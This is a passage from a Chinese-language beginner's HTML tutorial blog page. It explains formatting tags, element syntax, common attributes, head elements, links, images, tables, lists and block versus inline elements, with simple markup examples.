class="line">这个文本包含&lt;sub&gt;下标&lt;/sub&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这个文本包含&lt;sup&gt;上标&lt;/sup&gt;</span><br></pre></td></tr></table></figure><h3 id="定义预格式文本"><a href="#定义预格式文本" class="headerlink" title="定义预格式文本"></a>定义预格式文本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;pre&gt;</span><br><span class="line">此例演示如何使用 pre 标签</span><br><span class="line">对空行和    空格</span><br><span class="line">进行控制</span><br><span class="line">&lt;/pre&gt;</span><br></pre></td></tr></table></figure><p><strong>注：HTML未对此处的空格和换行进行处理为一个空格</strong></p><h3 id="定义缩写"><a href="#定义缩写" class="headerlink" title="定义缩写"></a>定义缩写</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;abbr title=&quot;etcetera&quot;&gt;etc.&lt;/abbr&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;acronym title=&quot;World Wide Web&quot;&gt;WWW&lt;/acronym&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;在某些浏览器中，当您把鼠标移至缩略词语上时，title 可用于展示表达的完整版本。&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;仅对于 IE 5 中的 acronym 元素有效。&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;对于 Netscape 6.2 中的 abbr 和 acronym 元素都有效。&lt;/p&gt;</span><br></pre></td></tr></table></figure><h3 id="文字方向"><a href="#文字方向" class="headerlink" title="文字方向"></a>文字方向</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;该段落文字从左到右显示。&lt;/p&gt;  </span><br><span class="line">&lt;p&gt;&lt;bdo dir=&quot;rtl&quot;&gt;该段落文字从右到左显示。&lt;/bdo&gt;&lt;/p&gt;  </span><br></pre></td></tr></table></figure><h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><h4 id="短引用"><a href="#短引用" class="headerlink" title="短引用"></a>短引用</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;q&gt;Build a future where people live in harmony with nature.&lt;/q&gt;</span><br></pre></td></tr></table></figure><h4 id="长引用"><a href="#长引用" class="headerlink" title="长引用"></a>长引用</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;blockquote cite=&quot;http://www.worldwildlife.org/who/index.html&quot;&gt;</span><br><span class="line">For 50 years, WWF has been protecting the future of nature. The worlds leading conservation organization, WWF works in 100 countries and is supported by 1.2 million members in the United States and close to 5 million globally.</span><br><span class="line">&lt;/blockquote&gt;</span><br></pre></td></tr></table></figure><h3 id="下划线-插入线-与删除线"><a href="#下划线-插入线-与删除线" class="headerlink" title="下划线(插入线)与删除线"></a>下划线(插入线)与删除线</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;My favorite color is &lt;del&gt;blue&lt;/del&gt; &lt;ins&gt;red&lt;/ins&gt;!&lt;/p&gt;</span><br></pre></td></tr></table></figure><h3 id="标签所对应的全拼"><a href="#标签所对应的全拼" class="headerlink" title="标签所对应的全拼"></a>标签所对应的全拼</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;b&gt;---bold</span><br><span class="line"></span><br><span class="line">&lt;em&gt;---emphasize</span><br><span class="line"></span><br><span class="line">&lt;i&gt;---italic</span><br><span class="line"></span><br><span class="line">&lt;sub&gt;---subscript</span><br><span class="line"></span><br><span class="line">&lt;sup&gt;---superscript</span><br><span class="line"></span><br><span class="line">&lt;ins&gt;---insert</span><br><span class="line"></span><br><span class="line">&lt;del&gt;---delete</span><br><span class="line"></span><br><span class="line">&lt;kbd&gt;---keyboard</span><br><span class="line"></span><br><span class="line">&lt;bdo&gt;---Bi-Directional Override</span><br><span class="line"></span><br><span class="line">&lt;q&gt;---quote</span><br><span class="line"></span><br><span class="line">&lt;dfn&gt;---define</span><br></pre></td></tr></table></figure><h2 id="HTML元素"><a href="#HTML元素" class="headerlink" title="HTML元素"></a><strong>HTML元素</strong></h2><p>开始标签常被称为<strong>起始标签（opening tag）</strong>，结束标签常称为<strong>闭合标签（closing tag</strong>)</p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><ul><li>HTML 元素以<strong>开始标签</strong>起始</li><li>HTML 元素以<strong>结束标签</strong>终止</li><li><strong>元素的内容</strong>是开始标签与结束标签之间的内容</li><li>某些 HTML 元素具有<strong>空内容（empty content）</strong></li><li>空元素<strong>在开始标签中进行关闭</strong>（以开始标签的结束而结束）</li><li>大多数 HTML 元素可拥有<strong>属性</strong></li></ul><h3 id="HTML-元素的嵌套"><a href="#HTML-元素的嵌套" class="headerlink" title="HTML 元素的嵌套"></a>HTML 元素的嵌套</h3><p>大多数 HTML 元素可以嵌套（HTML 元素可以包含其他 HTML 元素）。</p><h3 id="无结束标签"><a href="#无结束标签" class="headerlink" title="无结束标签"></a><strong>无结束标签</strong></h3><p>即使忘记了使用结束标签，大多数浏览器也会正确地显示 HTML。忘记使用结束标签会<strong>产生不可预料的结果或错误</strong>。</p><h2 id="HTML属性"><a href="#HTML属性" class="headerlink" title="HTML属性"></a>HTML属性</h2><p>属性是 HTML 元素提供的附加信息。</p><p><strong>实例</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://heyhjwei.github.io/&quot;</span>&gt;</span>这是一个链接使用了 href 属性<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>HTML 链接由 <code>&lt;a&gt;</code> 标签定义。链接的地址在 <strong>href 属性</strong>中指定</p><p><strong>引用属性值的方法</strong></p><ul><li>属性值应该始终被<strong>包括在引号内</strong>。</li><li>双引号是最常用的，不过使用单引号也没有问题。</li><li><strong>在某些个别的情况下，比如属性值本身就含有双引号，那么您必须使用单引号</strong></li></ul><p>例如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=&#x27;John &quot;ShotGun&quot; Nelson&#x27;</span><br></pre></td></tr></table></figure><p><strong>注意：</strong></p><ul><li>属性和属性值，尽量小写，本来这样做也方便些。</li><li>class 属性可以多用 <strong><code>class=&quot; &quot;</code></strong> （引号里面可以填入多个class属性）</li><li>id 属性只能单独设置 **<code>id=&quot; &quot;</code>**（只能填写一个，多个无效）</li></ul><p><strong>大多数 HTML 元素的属性</strong>：</p><table><thead><tr><th align="left">属性</th><th align="left">目的和用途</th><th align="left">可使用的元素</th></tr></thead><tbody><tr><td align="left">class</td><td align="left">可以用于选择和样式化元素。可以在 CSS 中使用类选择器来选择具有特定类名的元素，并应用样式规则。</td><td align="left">适用于大多数 HTML 元素，如<code>&lt;div&gt;</code>, <code>&lt;p&gt;</code>, <code>&lt;span&gt;</code>, <code>&lt;h1&gt;</code>, 等等</td></tr><tr><td align="left">id</td><td align="left">用于为元素指定唯一的标识符。可以使用 JavaScript 或 CSS 来选择具有特定 id 的元素，并对其进行操作或样式化。</td><td align="left">适用于大多数 HTML 元素，如<code>&lt;div&gt;</code>, <code>&lt;p&gt;</code>, <code>&lt;span&gt;</code>, <code>&lt;h1&gt;</code>, 等等</td></tr><tr><td align="left">style</td><td align="left">内联样式</td><td align="left">适用于大多数 HTML 元素，如<code>&lt;div&gt;</code>, <code>&lt;p&gt;</code>, <code>&lt;span&gt;</code>, <code>&lt;h1&gt;</code>, 等等</td></tr><tr><td align="left">src</td><td align="left">指定外部资源的 URL</td><td align="left"><code>&lt;img&gt;</code>, <code>&lt;script&gt;</code>, <code>&lt;iframe&gt;</code>, <code>&lt;video&gt;</code>, <code>&lt;audio&gt;</code>, 等等</td></tr><tr><td align="left">href</td><td align="left">用于创建超链接,指定链接的 URL</td><td align="left"><code>&lt;a&gt;</code>, <code>&lt;link&gt;</code>, <code>&lt;area&gt;</code>, 等等</td></tr><tr><td align="left">alt</td><td align="left">为图像元素提供替代文本。当图像无法加载或无法显示时，浏览器会显示 <code>alt</code> 属性中的文本。</td><td align="left"><code>&lt;img&gt;</code></td></tr><tr><td align="left">width</td><td align="left">元素的宽度</td><td align="left"><code>&lt;img&gt;</code>, <code>&lt;canvas&gt;</code>, <code>&lt;video&gt;</code>, <code>&lt;audio&gt;</code>, <code>&lt;table&gt;</code>, 等等</td></tr><tr><td align="left">height</td><td align="left">元素的高度</td><td align="left"><code>&lt;img&gt;</code>, <code>&lt;canvas&gt;</code>, <code>&lt;video&gt;</code>, <code>&lt;audio&gt;</code>, <code>&lt;table&gt;</code>, 等等</td></tr><tr><td align="left">disabled</td><td align="left">禁用元素，例如，可以将按钮元素 (<code>&lt;button&gt;</code>) 的 <code>disabled</code> 属性设置为 <code>true</code>，以禁用按钮，防止用户点击它。</td><td align="left"><code>&lt;button&gt;</code>, <code>&lt;input&gt;</code>, <code>&lt;select&gt;</code>, <code>&lt;textarea&gt;</code>, 等等</td></tr><tr><td align="left">readonly</td><td align="left">将元素设置为只读</td><td align="left"><code>&lt;input&gt;</code>, <code>&lt;textarea&gt;</code>, 等等</td></tr><tr><td align="left">placeholder</td><td align="left">输入字段的占位符文本</td><td align="left"><code>&lt;input&gt;</code>, <code>&lt;textarea&gt;</code>, 等等</td></tr><tr><td align="left">required</td><td align="left">设置元素为必填</td><td align="left"><code>&lt;input&gt;</code>, <code>&lt;select&gt;</code>, <code>&lt;textarea&gt;</code>, 等等</td></tr><tr><td align="left">value</td><td align="left">元素的值</td><td align="left"><code>&lt;input&gt;</code>, <code>&lt;button&gt;</code>, <code>&lt;option&gt;</code>, <code>&lt;textarea&gt;</code>, 等等</td></tr><tr><td align="left">checked</td><td align="left">设置复选框或单选按钮的选中状态</td><td align="left"><code>&lt;input type=&quot;checkbox&quot;&gt;</code>, <code>&lt;input type=&quot;radio&quot;&gt;</code>, 等等</td></tr><tr><td align="left">maxlength</td><td align="left">输入字段的最大字符数</td><td align="left"><code>&lt;input&gt;</code>, <code>&lt;textarea&gt;</code>, 等等</td></tr><tr><td align="left">min, max</td><td align="left">输入字段的最小值和最大值</td><td align="left"><code>&lt;input type=&quot;number&quot;&gt;</code>, <code>&lt;input type=&quot;date&quot;&gt;</code>, <code>&lt;input type=&quot;time&quot;&gt;</code>, 等等</td></tr><tr><td align="left">placeholder</td><td align="left">为输入字段提供占位符文本，用于提示用户输入的内容。例如，您可以在文本输入字段 (<code>&lt;input type=&quot;text&quot;&gt;</code>) 中使用 <code>placeholder</code> 属性来提供示例输入。</td><td align="left"><code>&lt;input type=&quot;text&quot;&gt;</code></td></tr></tbody></table><h2 id="HTML-头部"><a href="#HTML-头部" class="headerlink" title="HTML 头部"></a>HTML 头部</h2><p><code>&lt;head&gt;</code> 元素包含了所有的头部标签元素。在 <code>&lt;head&gt;</code>元素中你可以插入脚本（scripts）, 样式文件（CSS），及各种meta信息。</p><p>可以添加在头部区域的元素标签为: <code>&lt;title&gt;</code>, <code>&lt;style&gt;</code>, <code>&lt;meta&gt;</code>, <code>&lt;link&gt;</code>, <code>&lt;script&gt;</code>, <code>&lt;noscript&gt;</code> 和 <code>&lt;base&gt;</code>。</p><h3 id="元素"><a href="#元素" class="headerlink" title="&lt;title&gt; 元素"></a><strong><code>&lt;title&gt;</code> 元素</strong></h3><p><code>&lt;title&gt;</code> 标签定义了不同文档的标题。<code>&lt;title&gt;</code> 在 HTML&#x2F;XHTML 文档中是必需的。</p><ul><li>定义了浏览器工具栏的标题</li><li>当网页添加到收藏夹时，显示在收藏夹中的标题</li><li>显示在搜索引擎结果页面的标题</li></ul><p>HTML<code>&lt;title&gt;</code>元素不仅可以显示文本，也可以在左侧显示logo等图片。显示时，要将<code>&lt;link&gt;</code>标签放入<code>&lt;head&gt;</code>里。</p><h3 id="元素-1"><a href="#元素-1" class="headerlink" title="&lt;base&gt; 元素"></a><strong><code>&lt;base&gt;</code> 元素</strong></h3><p><code>&lt;base&gt;</code> 标签描述了基本的链接地址&#x2F;链接目标，该标签作为HTML文档中所有的链接标签的默认链接:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span> <span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">&quot;http://www.runoob.com/images/&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="元素-2"><a href="#元素-2" class="headerlink" title="&lt;link&gt; 元素"></a><strong><code>&lt;link&gt;</code> 元素</strong></h3><p><code>&lt;link&gt;</code> 标签定义了文档与外部资源之间的关系。</p><p><code>&lt;link&gt;</code> 标签通常用于链接到样式表:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span> <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;mystyle.css&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="元素-3"><a href="#元素-3" class="headerlink" title="&lt;style&gt; 元素"></a><strong><code>&lt;style&gt;</code> 元素</strong></h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"> 标签定义了<span class="selector-tag">HTML</span>文档的样式文件引用地址.</span></span><br></pre></td></tr></table></figure><p>在<code>&lt;style&gt;</code> 元素中你也可以直接添加样式来渲染 HTML 文档:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span> <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"> <span class="selector-tag">body</span> &#123;    <span class="attribute">background-color</span>:yellow; &#125; <span class="selector-tag">p</span> &#123;    <span class="attribute">color</span>:blue &#125; </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span> <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="元素-4"><a href="#元素-4" class="headerlink" title="&lt;meta&gt; 元素"></a><strong><code>&lt;meta&gt;</code> 元素</strong></h3><p>meta标签描述了一些基本的元数据。元数据也不显示在页面上，但会被浏览器解析。元数据可以使用于浏览器（如何显示内容或重新加载页面），搜索引擎（关键词），或其他Web服务。META 元素通常用于指定网页的描述，关键词，文件的最后修改时间，作者，和其他元数据。</p><p><code>&lt;meta&gt;</code> 一般放置于 <code>&lt;head&gt;</code> 区域</p><p> <strong>使用实例</strong></p><p>为搜索引擎定义关键词:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta name=&quot;keywords&quot; content=&quot;HTML, CSS, XML, XHTML, JavaScript&quot;&gt;</span><br></pre></td></tr></table></figure><p>为网页定义描述内容:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta name=&quot;description&quot; content=&quot;免费 Web &amp; 编程 教程&quot;&gt;</span><br></pre></td></tr></table></figure><p>定义网页作者:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta name=&quot;author&quot; content=&quot;Runoob&quot;&gt;</span><br></pre></td></tr></table></figure><p>每30秒钟刷新当前页面:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;refresh&quot; content=&quot;30&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="HTML-元素"><a href="#HTML-元素" class="headerlink" title="HTML &lt;script&gt; 元素"></a><strong>HTML <code>&lt;script&gt;</code> 元素</strong></h3><p><code>&lt;script&gt;</code>标签用于加载脚本文件，如： JavaScript。</p><h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p>HTML 链接是通过标签 <code>&lt;a&gt;</code> 来定义的。</p><p>超链接可以是一个字，一个词，或者一组词，也可以是一幅图像，可以点击这些内容来跳转到新的文档或者当前文档中的某个部分。</p><h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><p>以下是 HTML 中创建链接的基本语法和属性：<code>code&gt;&lt;a&gt;</code> 元素：创建链接的主要HTML元素是<code>&lt;a&gt;</code>（锚）元素。<code>&lt;a&gt;</code>元素具有以下属性：</p><ul><li><code>href</code>：指定链接目标的URL，这是链接的最重要属性。可以是另一个网页的URL、文件的URL或其他资源的URL。</li><li><code>target</code>（可选）：指定链接如何在浏览器中打开。常见的值包括 <code>_blank</code>（在新标签或窗口中打开链接）和 <code>_self</code>（在当前标签或窗口中打开链接）。</li><li><code>title</code>（可选）：提供链接的额外信息，通常在鼠标悬停在链接上时显示为工具提示。</li><li><code>rel</code>（可选）：指定与链接目标的关系，如 nofollow、noopener 等。</li></ul><h3 id="使用实例"><a href="#使用实例" class="headerlink" title="使用实例"></a>使用实例</h3><p><strong>文本链接：</strong>最常见的链接类型是文本链接，它使用 <code>&lt;a&gt;</code> 元素将一段文本转化为可点击的链接，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;https://www.example.com&quot;&gt;访问示例网站&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><strong>图像链接：</strong>您还可以使用图像作为链接。在这种情况下，<code>&lt;a&gt;</code> 元素包围着 <code>&lt;img&gt;</code> 元素。例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;https://www.example.com&quot;&gt;</span><br><span class="line">  &lt;img src=&quot;example.jpg&quot; alt=&quot;示例图片&quot;&gt;</span><br><span class="line">&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><strong>锚点链接：</strong>除了链接到其他网页外，您还可以在同一页面内创建内部链接，这称为锚点链接。要创建锚点链接，需要在目标位置使用 <code>&lt;a&gt;</code> 元素定义一个标记，并使用#符号引用该标记。例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;#section2&quot;&gt;跳转到第二部分&lt;/a&gt;</span><br><span class="line">&lt;!-- 在页面中的某个位置 --&gt;</span><br><span class="line">&lt;a name=&quot;section2&quot;&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><strong>下载链接：</strong>如果您希望链接用于下载文件而不是导航到另一个网页，可以使用 download 属性。例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;document.pdf&quot; download&gt;下载文档&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><strong>跳转id链接</strong> </p><p>id 属性可用于创建一个 HTML 文档书签。</p><p><strong>提示:</strong> 书签不会以任何特殊方式显示，即在 HTML 页面中是不显示的，所以对于读者来说是隐藏的。</p><p>在HTML文档中创建一个链接到”有用的提示部分(id&#x3D;”tips”）”：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;#tips&quot;&gt;访问有用的提示部分&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>或者，从另一个页面创建一个链接到”有用的提示部分(id&#x3D;”tips”）”：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;https://www.runoob.com/html/html-links.html#tips&quot;&gt;</span><br><span class="line">访问有用的提示部分&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><strong>邮箱链接</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;--案例1 --&gt;&lt;/--&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;mailto:someone@example.com?Subject=Hello%20again&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_top&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"> &lt;--案例2 --&gt;&lt;/--&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;mailto:someone@example.com?cc=someoneelse@example.com&amp;bcc=andsomeoneelse@example.com&amp;subject=Summer%20Party&amp;body=You%20are%20invited%20to%20a%20big%20summer%20party!&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_top&quot;</span>&gt;</span>发送邮件!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>案例2可设置指定的收件内容以及内容</p><h2 id="图像"><a href="#图像" class="headerlink" title="图像"></a>图像</h2><p>HTML 图像是通过标签 <code>&lt;img&gt;</code> 来定义的.<code>&lt;img&gt;</code> 是空标签，意思是说，它只包含属性，并且没有闭合标签。</p><h3 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a><strong>语法</strong></h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;url&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;some_text&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Alt属性"><a href="#Alt属性" class="headerlink" title="Alt属性"></a><strong>Alt属性</strong></h3><p><code>alt</code> 属性用来为图像定义一串预备的可替换的文本。</p><p>替换文本属性的值是用户定义的。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;boat.gif&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Big Boat&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在浏览器无法载入图像时，此时，浏览器将显示这个替代性的文本而不是图像。</p><h3 id="设置图像的高度与宽度"><a href="#设置图像的高度与宽度" class="headerlink" title="设置图像的高度与宽度"></a>设置图像的高度与宽度</h3><p>height（高度） 与 width（宽度）属性用于设置图像的高度与宽度。</p><p>属性值默认单位为像素:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;pulpit.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Pulpit rock&quot;</span> <span class="attr">width</span>=<span class="string">&quot;304&quot;</span> <span class="attr">height</span>=<span class="string">&quot;228&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>实例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://hijwei.top/images/redefine-avatar.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;cola&quot;</span> <span class="attr">width</span>=<span class="string">&quot;39&quot;</span> <span class="attr">height</span>=<span class="string">&quot;39&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>实现效果</p><img src="https://hijwei.top/images/redefine-avatar.jpg" alt="cola" width="39" height="39" /><h2 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h2><p>HTML 表格由 <strong><code>&lt;table&gt;</code></strong> 标签来定义。HTML 表格是一种用于展示结构化数据的标记语言元素。</p><p><code>&lt;table&gt;</code> 元素表示整个表格，它包含两个主要部分：<code>&lt;thead&gt;</code> 和 <code>&lt;tbody&gt;</code>。</p><ul><li><strong><code>&lt;thead &gt;</code> 用于定义表格的标题部分:</strong> 在 <code>&lt;thead &gt;</code> 中，使用 <code>&lt;th &gt;</code> 元素定义列的标题，以上实例中列标题分别为”列标题1”，”列标题2”和”列标题3”。</li><li><strong><code>&lt;tbody &gt;</code> 用于定义表格的主体部分:</strong> 在 <code>&lt;tbody &gt;</code> 中，使用 <code>&lt;tr &gt;</code> 元素定义行，并在每行中使用 <code>&lt;td &gt;</code> 元素定义单元格数据，以上实例中有两行数据，每行包含三个单元格。</li></ul><p>每个表格均有若干行（由 <strong><code>&lt;tr&gt;</code></strong> 标签定义），每行被分割为若干单元格（由 <strong><code>&lt;td&gt;</code></strong> 标签定义），表格可以包含标题行（**<code>&lt;th&gt;</code>**）用于定义列的标题。</p><ul><li><strong>tr</strong>：tr 是 table row 的缩写，表示表格的一行。</li><li><strong>td</strong>：td 是 table data 的缩写，表示表格的数据单元格。</li><li><strong>th</strong>：th 是 table header的缩写，表示表格的表头单元格。</li></ul><p>数据单元格可以包含文本、图片、列表、段落、表单、水平线、表格等等。</p><h3 id="表格和边框属性"><a href="#表格和边框属性" class="headerlink" title="表格和边框属性"></a>表格和边框属性</h3><p>如果不定义边框属性，表格将不显示边框。有时这很有用，但是大多数时候，我们希望显示边框。使用边框属性来显示一个带有边框的表格<code>table</code>后面加入<code>border=&quot;1&quot;</code></p><h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><p>列表项内部可以使用段落、换行符、图片、链接以及其他列表等等。</p><h3 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h3><p>无序列表是一个项目的列表，此列项目使用粗体圆点（典型的小黑圆圈）进行标记。</p><p>无序列表使用 <code>&lt;ul&gt;</code> 标签</p><h3 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h3><p>同样，有序列表也是一列项目，列表项目使用数字进行标记。 有序列表始于 <code>&lt;ol&gt;</code> 标签。每个列表项始于 <code>&lt;li&gt;</code> 标签。</p><p>列表项使用数字来标记。</p><h3 id="自定义列表"><a href="#自定义列表" class="headerlink" title="自定义列表"></a>自定义列表</h3><p>自定义列表不仅仅是一列项目，而是项目及其注释的组合。自定义列表以 <code>&lt;dl&gt;</code> 标签开始。每个自定义列表项以 <code>&lt;dt&gt;</code> 开始。每个自定义列表项的定义以 <code>&lt;dd&gt;</code> 开始。</p><h2 id="HTML-区块"><a href="#HTML-区块" class="headerlink" title="HTML 区块"></a>HTML 区块</h2><h3 id="区块元素和内联元素"><a href="#区块元素和内联元素" class="headerlink" title="区块元素和内联元素"></a>区块元素和内联元素</h3><h3 id="HTML-区块元素"><a href="#HTML-区块元素" class="headerlink" title="HTML 区块元素"></a>HTML 区块元素</h3><p>大多数 HTML 元素被定义为<strong>块级元素</strong>或<strong>内联元素</strong>。</p><p>块级元素在浏览器显示时，通常会以新行来开始（和结束）。</p><p>实例: <code>&lt;div&gt;</code>、<code>&lt;h1&gt;</code>, <code>&lt;p&gt;</code>, <code>&lt;ul&gt;</code>, <code>&lt;table&gt;</code></p><h3 id="HTML-内联元素"><a href="#HTML-内联元素" class="headerlink" title="HTML 内联元素"></a>HTML 内联元素</h3><p>内联元素在显示时通常不会以新行开始。</p><p>实例: <code>&lt;span&gt;</code>,<code>&lt;b&gt;</code>, <code>&lt;td&gt;</code>, <code>&lt;a&gt;</code>, <code>&lt;img&gt;</code></p><p><strong><code>&lt;div&gt;</code>与 <code>&lt;span&gt;</code></strong></p><p><code>&lt;div&gt;</code> 是块级元素，它独占一行，可以设置宽度、高度以及边距等样式属性。它适合用于创建页面的大块结构，例如页面的主体区域、容器、布局等。</p><p><code>&lt;span&gt;</code> 是行内元素，它不会独占一行，宽度默认由其内容决定。它适合用于对文本或其他行内元素进行样式化、标记或包裹。</p><p><strong>嵌套关系：</strong></p><ul><li><code>&lt;div&gt;</code> 可以容纳其他块级元素和行内元素，包括其他的 